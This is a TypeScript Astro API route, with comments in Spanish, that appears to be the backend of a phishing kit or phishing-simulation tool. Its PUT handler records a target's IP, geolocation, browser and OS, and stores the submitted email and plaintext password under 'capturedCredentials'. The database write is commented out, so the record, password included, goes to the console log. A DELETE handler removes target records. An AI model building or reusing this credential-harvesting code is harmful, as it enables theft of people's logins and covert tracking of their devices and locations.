import type { APIRoute } from "astro";

import { app } from "@/firebase/server";
import { FieldValue, getFirestore } from "firebase-admin/firestore";
import { UAParser } from 'ua-parser-js';

const db = getFirestore(app);
const phishingUsersRef = db.collection("phishingUsers");

export const PUT: APIRoute = async ({ params, request }) => {
  try {
    const userId = params.id;
    if (!userId) return new Response(JSON.stringify({ error: "ID requerido" }), { status: 400 });

    const userRef = phishingUsersRef.doc(userId);
    const userSnapshot = await userRef.get();

    if (!userSnapshot.exists) {
      return new Response(JSON.stringify({ error: "Usuario no encontrado" }), { status: 404 });
    }

    const data = await request.json();
    const userAgent = data.metadata?.userAgent || "";
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();

    // Actualización atómica con FieldValue
    const updateData: any = {
      "metadata.ip": data.ip || "unknown",
      "metadata.geolocation": data.metadata?.geolocation || {},
      "metadata.userAgent": userAgent,
      "metadata.device.os": os.name || "unknown",
      "metadata.device.browser": browser.name || "unknown",
      "metadata.device.screenResolution": data.device?.screenResolution || "unknown",
      "status.lastActivityAt": FieldValue.serverTimestamp()
    };

    // Manejo separado para email y password
    if (data.email) {
      updateData["capturedCredentials.email"] = data.email;
      updateData["status.emailSubmitted"] = true;
    }

    if (data.password) {
      updateData["capturedCredentials.password"] = data.password;
      updateData["status.passwordSubmitted"] = true;
    }

    console.log(updateData);

    // await userRef.update(updateData);

    return new Response(JSON.stringify({ success: true }), { status: 200 });

  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: "Error en servidor" }), { status: 500 });
  }
};

// Eliminar un usuario
export const DELETE: APIRoute = async ({ params }) => {
  try {
    const userId = params.id;
    if (!userId) {
      return new Response(JSON.stringify({ error: "ID de usuario no proporcionado" }), {
        status: 400,
      });
    }

    await phishingUsersRef.doc(userId).delete();
    return new Response(JSON.stringify({ message: "Usuario eliminado" }), {
      status: 200,
    });
  } catch (error) {
    return new Response(JSON.stringify({ error: "Error al eliminar usuario" }), {
      status: 500,
    });
  }
};
